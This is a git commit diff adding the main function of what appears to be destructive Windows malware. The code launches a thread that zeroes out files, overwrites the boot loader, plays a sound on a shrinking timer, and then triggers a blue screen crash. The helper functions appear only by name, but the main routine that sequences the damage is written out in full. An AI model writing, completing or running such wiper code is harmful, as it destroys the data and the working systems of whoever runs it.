73db83f45a37aabd663f9f160237108bf8ee75e8
bemxio <bemxiov@protonmail.com>
2023-02-04 11:54:20 +0100

    add the code for the main function

--- src/main.c
+++ src/main.c
@@ -1,5 +1,23 @@
-#include "payloads.h"
+#include "utils.h"
+
+#include <pthread.h>
+#include <windows.h>
+
+#define SOUND_PATH "assets/sound.wav"
+#define INITIAL_DELAY 500
 
 int main() {
-    return 0;
+    pthread_t thread;
+    pthread_create(&thread, NULL, (void*)ZeroOutFiles, NULL);
+    
+    OverwriteBootloader();
+    
+    for (unsigned short delay = INITIAL_DELAY; delay > 0; delay--) {
+        PlaySound(SOUND_PATH, NULL, SND_FILENAME | SND_ASYNC);
+        Sleep(delay * 1000);
+    }
+
+    TriggerBSOD();
+
+    return 1;
 }
